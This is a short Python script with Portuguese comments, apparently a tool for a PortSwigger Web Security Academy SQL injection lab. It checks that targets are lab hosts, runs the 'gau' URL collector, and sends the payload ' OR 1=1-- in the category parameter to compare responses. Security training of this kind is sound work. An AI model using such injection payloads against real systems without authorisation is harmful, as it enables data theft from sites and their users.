# validação do lab da port

def validar_url_port_swigger(url):
    try:
        url = url.strip().strip("<>[]()")

        parsed = urlparse(url)

        print("URL recebida:", repr(url))
        print("Scheme:", repr(parsed.scheme))
        print("Hostname:", repr(parsed.hostname))

        if parsed.scheme.lower() != "https":
            return False

        host = (parsed.hostname or "").lower().strip(".")

        if host == "web-security-academy.net":
            return True

        if host.endswith(".web-security-academy.net"):
            return True

        return False

    except Exception as erro:
        print("Erro ao validar URL:", erro)
        return False

def executar_gau(target_url):
    """
    Executa o GAU usando somente o hostname do laboratório.
    """

    host = urlparse(target_url).hostname

    if not host:
        return []

    try:
        processo = subprocess.run(
            ["gau", host],
            capture_output=True,
            text=True,
            timeout=60
        )

        if processo.returncode != 0:
            return []

        urls = []

        for linha in processo.stdout.splitlines():
            linha = linha.strip()

            if linha:
                urls.append(linha)

        return urls

    except FileNotFoundError:
        return []

    except subprocess.TimeoutExpired:
        return []

    except Exception:
        return []


# teste basico de  sql injection

def testar_sqli(target_url):
    """
    Teste destinado exclusivamente ao laboratório autorizado
    da PortSwigger Web Security Academy.

    SQL injection vulnerability in WHERE clause allowing
    retrieval of hidden data.
    """

    payload = "' OR 1=1--"

    try:

        resposta_normal = requests.get(
            target_url,
            params={
                "category": "Gifts"
            },
            timeout=10
        )

        resposta_teste = requests.get(
            target_url,
            params={
                "category": payload
            },
            timeout=10
        )

        return {
            "normal_status": resposta_normal.status_code,
            "normal_size": len(resposta_normal.text),

            "teste_status": resposta_teste.status_code,
            "teste_size": len(resposta_teste.text),

            "url_teste": resposta_teste.url
        }

    except requests.RequestException as erro:

        return {
            "erro": str(erro)
        }



